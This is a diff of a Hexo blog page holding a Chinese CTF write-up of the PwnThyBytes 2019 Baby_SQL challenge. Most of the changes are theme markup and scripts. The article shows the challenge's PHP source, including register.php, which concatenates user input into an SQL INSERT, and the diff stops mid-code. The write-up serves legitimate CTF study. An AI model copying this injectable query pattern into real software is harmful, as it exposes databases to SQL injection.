@@ -6,6 +6,70 @@
     <meta name="keywords" content="Hexo Theme Redefine">
     
     <meta name="author" content="dawn_r1sing">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
     <!-- preconnect -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -18,12 +82,15 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="寒假week 1[PwnThyBytes 2019]Baby_SQL根据题目提示这是一道SQL注入 1.找注入点index.php 12345678910111213141516&lt;?phpsession_start();	&#x2F;&#x2F;开启会话&#x2F;&#x2F;遍历session数组（键值$key 值$value）&#x2F;&#x2F;传的参都会经过filter函数处理，绕过好像很麻烦诶foreach ($_SESSION as $">
+    
+    
+        
+        <meta name="description" content="阿巴阿巴">
 <meta property="og:type" content="article">
 <meta property="og:title" content="寒假training-1">
 <meta property="og:url" content="http://dawnringdong.github.io/2024/04/07/%E5%AF%92%E5%81%87training-1/index.html">
 <meta property="og:site_name" content="dawn">
-<meta property="og:description" content="寒假week 1[PwnThyBytes 2019]Baby_SQL根据题目提示这是一道SQL注入 1.找注入点index.php 12345678910111213141516&lt;?phpsession_start();	&#x2F;&#x2F;开启会话&#x2F;&#x2F;遍历session数组（键值$key 值$value）&#x2F;&#x2F;传的参都会经过filter函数处理，绕过好像很麻烦诶foreach ($_SESSION as $">
+<meta property="og:description" content="阿巴阿巴">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="c:\Users\13600\AppData\Roaming\Typora\typora-user-images\image-20240123173942315.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202401231812477.png">
@@ -59,9 +126,8 @@
     
     <title>
         
-            寒假training-1 -
+            寒假training-1 | dawn_r1sing
         
-        dawn_r1sing
     </title>
 
     
@@ -72,182 +138,32 @@
     
 
     
-        <style>
-    :root {
-        --preloader-background-color: #fff;
-        --preloader-text-color: #000;
-    }
-
-    @media (prefers-color-scheme: dark) {
-        :root {
-            --preloader-background-color: #202124;
-            --preloader-text-color: #fff;
-        }
-    }
-
-    @media (prefers-color-scheme: light) {
-        :root {
-            --preloader-background-color: #fff;
-            --preloader-text-color: #000;
-        }
-    }
-
-    @media (max-width: 600px) {
-        .ml13 {
-            font-size: 2.6rem !important; /* Adjust this value as needed */
-        }
-    }
-
-    .preloader {
-        display: flex;
-        flex-direction: column;
-        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
-        align-items: center;
-        justify-content: center;
-        position: fixed;
-        padding: 12px;
-        top: 0;
-        right: 0;
-        bottom: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh; /* 'h-screen' is 100% of the viewport height */
-        background-color: var(--preloader-background-color);
-        z-index: 1100; /* 'z-[1100]' sets the z-index */
-        transition: opacity 0.2s ease-in-out;
-    }
-
-    .ml13 {
-        font-size: 3.2rem;
-        /* text-transform: uppercase; */
-        color: var(--preloader-text-color);
-        letter-spacing: -1px;
-        font-weight: 500;
-        font-family: 'Chillax-Variable', sans-serif;
-        text-align: center;
-    }
-
-    .ml13 .word {
-        display: inline-flex;
-        flex-wrap: wrap;
-        white-space: nowrap;
-    }
-
-    .ml13 .letter {
-        display: inline-block;
-        line-height: 1em;
-    }
-</style>
-
-<div class="preloader">
-    
-<script src="/js/libs/anime.min.js"></script>
-
-    <h1 class="ml13">
-        dawn_r1sing
-    </h1>
-    <script>
-        var textWrapper = document.querySelector('.ml13');
-        // Split text into words
-        var words = textWrapper.textContent.trim().split(' ');
-
-        // Clear the existing content
-        textWrapper.innerHTML = '';
-
-        // Wrap each word and its letters in spans
-        words.forEach(function(word) {
-            var wordSpan = document.createElement('span');
-            wordSpan.classList.add('word');
-            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
-            textWrapper.appendChild(wordSpan);
-            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
-        });
-
-
-        anime.timeline({loop: true})
-            .add({
-                targets: '.ml13 .letter',
-                translateY: [100,0],
-                translateZ: 0,
-                opacity: [0,1],
-                easing: "easeOutExpo",
-                duration: 1400,
-                delay: (el, i) => 300 + 30 * i
-            }).add({
-            targets: '.ml13 .letter',
-            translateY: [0,-100],
-            opacity: [1,0],
-            easing: "easeInExpo",
-            duration: 1200,
-            delay: (el, i) => 100 + 30 * i
-        });
-
-        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
-
-        // If the theme status is not found in local storage, check the preferred color scheme
-        if (themeStatus === undefined || themeStatus === null) {
-            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
-                themeStatus = 'dark';
-            } else {
-                themeStatus = 'light';
-            }
-        }
-
-        // Now you can use the themeStatus variable in your code
-        if (themeStatus) {
-            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
-            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
-        } else {
-            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
-            document.documentElement.style.setProperty('--preloader-text-color', '#000');
-        }
-
-        window.addEventListener('load', function () {
-            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
-        });
-
-        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
-        hidePreloaderAfterTimeout(5000);
-
-        function hidePreloaderAfterTimeout(delay) {
-            setTimeout(function () {
-                var preloader = document.querySelector('.preloader');
-                preloader.style.opacity = '0';
-                setTimeout(function () {
-                    preloader.style.display = 'none';
-                }, 200);
-            }, delay);
-        }
-    </script>
-</div>
-    
-
-    
 <link rel="stylesheet" href="/css/style.css">
 
 
     
         
-<link rel="stylesheet" href="/assets/build/styles.css">
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
     
 
     
-<link rel="stylesheet" href="/fonts/fonts.css">
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
 
     
-<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
 
     <!--- Font Part-->
     
     
     
     
-
+    
+    
 
     <script id="hexo-configurations">
     window.config = {"hostname":"dawnringdong.github.io","root":"/","language":"en"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"dawn_r1sing","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn?c=d&c=i&c=j&c=k&c=i"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":"xiaoran_dong@163.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-home# can be empty"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folders"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/10/29 12:00:00"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":false,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"dawn_r1sing","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn?c=d&c=i&c=j&c=k&c=i"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":"xiaoran_dong@163.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-home# can be empty"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folders"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/10/29 12:00:00"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -270,34 +186,28 @@
     
     
 <!-- hexo injector head_end start -->
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
 <!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
 
 
+
 <body>
-<div class="progress-bar-container">
-    
+	<div class="progress-bar-container">
+	
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
+	
 </div>
-
 
 <main class="page-container" id="swup">
 
-    
+	
 
-    <div class="main-content-container">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
-
-    <div class="navbar-content ">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
         <div class="left">
             
             <a class="logo-title" href="/">
@@ -387,7 +297,7 @@
     </div>
 
     <!-- Mobile sheet -->
-    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
         <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
             
                 
@@ -508,40 +418,37 @@
 </header>
 
 
-        </div>
+		</div>
 
-        <div class="main-content-body">
+		<div class="main-content-body transition-fade-up">
+			
 
-            
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-            <div class="main-content">
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">寒假training-1</h1>
+			</div>
+			
+		</div>
 
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">寒假training-1</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310291726035.jpg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">dawn_r1sing</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310291726035.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">dawn_r1sing</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-04-07 11:06:54</span>
@@ -609,24 +516,24 @@
     
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
+				</div>
+			</div>
+		</div>
+		
 
-        
+		
 
 
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="寒假week-1"><a href="#寒假week-1" class="headerlink" title="寒假week 1"></a>寒假week 1</h1><h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>根据题目提示这是一道SQL注入</p>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="寒假week-1"><a href="#寒假week-1" class="headerlink" title="寒假week 1"></a>寒假week 1</h1><h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>根据题目提示这是一道SQL注入</p>
 <h5 id="1-找注入点"><a href="#1-找注入点" class="headerlink" title="1.找注入点"></a>1.找注入点</h5><p>index.php</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();	<span class="comment">//开启会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历session数组（键值$key 值$value）</span></span><br><span class="line"><span class="comment">//传的参都会经过filter函数处理，绕过好像很麻烦诶</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_POST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);	<span class="comment">//防SQL机制addslashes()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();	<span class="comment">//开启会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历session数组（键值$key 值$value）</span></span><br><span class="line"><span class="comment">//传的参都会经过filter函数处理，绕过好像很麻烦诶</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_POST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">filter</span>(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);	<span class="comment">//防SQL机制addslashes()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>register.php</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤很严</span></span><br><span class="line">(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(a|d|m|i|n)/&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) OR <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &lt; <span class="number">6</span> OR <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &gt; <span class="number">10</span> OR !<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;INSERT INTO `ptbctf`.`ptbctf` (`username`, `password`) VALUES (&quot;&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot;,&quot;&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line">(<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span> AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&quot;The user was created successfully!&quot;</span>)) <span class="title function_ invoke__">OR</span> (<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&quot;Error!&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤很严</span></span><br><span class="line">(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(a|d|m|i|n)/&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) OR <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &lt; <span class="number">6</span> OR <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &gt; <span class="number">10</span> OR !<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;INSERT INTO `ptbctf`.`ptbctf` (`username`, `password`) VALUES (&quot;&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot;,&quot;&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line">(<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span> AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&quot;The user was created successfully!&quot;</span>)) <span 